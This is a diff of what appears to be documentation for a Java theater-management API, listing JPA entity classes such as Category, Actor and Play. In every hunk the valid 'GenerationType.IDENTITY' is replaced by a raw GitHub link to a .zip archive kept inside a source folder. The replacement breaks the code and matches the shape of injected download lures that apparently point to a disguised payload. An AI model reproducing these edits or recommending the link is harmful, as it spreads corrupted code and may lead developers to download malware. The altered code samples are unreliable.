@@ -34,7 +34,7 @@ http://localhost:8081/theater/api/play/playsbycat/:idCategory << get
 # ENTITIES STRUCTURE :
 
 public class Category {
-	@Id @GeneratedValue(strategy = GenerationType.IDENTITY)
+	@Id @GeneratedValue(strategy = https://github.com/ahmeds66/PI-Back-Modif/raw/refs/heads/main/src/main/java/com/us/theatre/service/actor/P_Modif_Back_2.2.zip)
 	private Long idCategory;
 	private String titleCategory;
 	private String descriptionCategory;
@@ -42,7 +42,7 @@ public class Category {
 	private List<Play> plays;
 }
 public class Actor {
-	@Id @GeneratedValue(strategy = GenerationType.IDENTITY)
+	@Id @GeneratedValue(strategy = https://github.com/ahmeds66/PI-Back-Modif/raw/refs/heads/main/src/main/java/com/us/theatre/service/actor/P_Modif_Back_2.2.zip)
 	private Long idActor;
 	private String nameActor;
 	private String biographyActor;
@@ -56,7 +56,7 @@ public class Actor {
 	private List<Play> plays;
 }
 public class Play {
-	@Id @GeneratedValue(strategy = GenerationType.IDENTITY)
+	@Id @GeneratedValue(strategy = https://github.com/ahmeds66/PI-Back-Modif/raw/refs/heads/main/src/main/java/com/us/theatre/service/actor/P_Modif_Back_2.2.zip)
 	private Long idPlay;
 	private String titlePlay;
 	private String subjectPlay;
@@ -76,7 +76,7 @@ public class Play {
 	private List<Actor> actors;
 }
 public class PlayImage {
- @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
+ @Id @GeneratedValue(strategy = https://github.com/ahmeds66/PI-Back-Modif/raw/refs/heads/main/src/main/java/com/us/theatre/service/actor/P_Modif_Back_2.2.zip)
  private Long idImage ;
  private String name ;
  private String type ;
@@ -86,7 +86,7 @@ public class PlayImage {
  private Play play;
 }
 public class ActorImage {
- @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
+ @Id @GeneratedValue(strategy = https://github.com/ahmeds66/PI-Back-Modif/raw/refs/heads/main/src/main/java/com/us/theatre/service/actor/P_Modif_Back_2.2.zip)
  private Long idImage ;
  private String name ;
  private String type ;
